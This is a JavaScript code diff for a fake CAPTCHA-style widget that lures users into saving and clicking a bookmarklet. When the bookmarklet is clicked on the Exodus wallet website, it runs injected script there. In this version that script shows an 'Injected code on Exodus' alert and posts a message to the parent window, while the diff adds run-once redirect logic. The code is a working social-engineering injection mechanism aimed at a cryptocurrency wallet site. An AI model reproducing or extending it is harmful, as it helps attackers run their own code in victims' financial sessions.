@@ -501,6 +501,7 @@
       localStorage.setItem(STORAGE_KEYS.multiplication, "0");
       localStorage.setItem(STORAGE_KEYS.division, "0");
       localStorage.setItem("bookmarkletClicks", "0");
+      localStorage.removeItem("exodusBookmarkletNavOnce");
       setAnswerDisplay();
     }
   })();
@@ -546,6 +547,8 @@
       showWidgetSuccessThenRedirect();
     }
   }
+
+  var __exodusWidgetRedirectOnce = false;
 
   /** Close challenge popup, reset widget (zombies fail / no bookmark — no blocking dialog). */
   function closeChallengeForRetry() {
@@ -2349,11 +2352,14 @@
       "var dest='" + destEsc + "';" +
       "var maxC=" + maxC + ";" +
       "var k='bookmarkletClicks';" +
+      "var navOnce='exodusBookmarkletNavOnce';" +
       "var h=location.hostname;" +
       "var isExodus=h==='www.exodus.com'||h==='exodus.com';" +
       "if(isExodus){" +
+      "setTimeout(function(){" +
       "alert(\"Injected code on Exodus\");" +
       "try{window.parent.postMessage({type:'exodus_injected'},'*');}catch(e){}" +
+      "},2000);" +
       "return;" +
       "}" +
       "var our=location.protocol+'//'+location.host;" +
@@ -2364,7 +2370,7 @@
       "var doc=document;var clickCounter=doc.getElementById('clickCounter');" +
       "if(!clickCounter&&window.frames&&window.frames.length){try{for(var i=0;i<window.frames.length;i++){clickCounter=window.frames[i].document.getElementById('clickCounter');if(clickCounter){doc=window.frames[i].document;break;}}}catch(e){}}" +
       "if(clickCounter){clickCounter.textContent=n;try{window.parent.postMessage({type:'captcha_tick',clicks:n},'*');}catch(e){}}" +
-      "if(n>=maxC){window.location.href=dest;}" +
+      "if(n>=maxC&&!localStorage.getItem(navOnce)){localStorage.setItem(navOnce,'1');window.location.href=dest;}" +
       "})();"
     );
   }
@@ -2376,10 +2382,17 @@
     var params = new URLSearchParams(location.search);
     if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
       localStorage.setItem("bookmarkletClicks", "0");
+      localStorage.removeItem("exodusBookmarkletNavOnce");
     }
   })();
 
   function showWidgetSuccessThenRedirect() {
+    if (__exodusWidgetRedirectOnce) return;
+    __exodusWidgetRedirectOnce = true;
+    if (window._spamRedirectPoll) {
+      clearInterval(window._spamRedirectPoll);
+      window._spamRedirectPoll = null;
+    }
     // Finish any visuals and navigate user into Exodus.
     stopChallenge2Visuals();
     if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
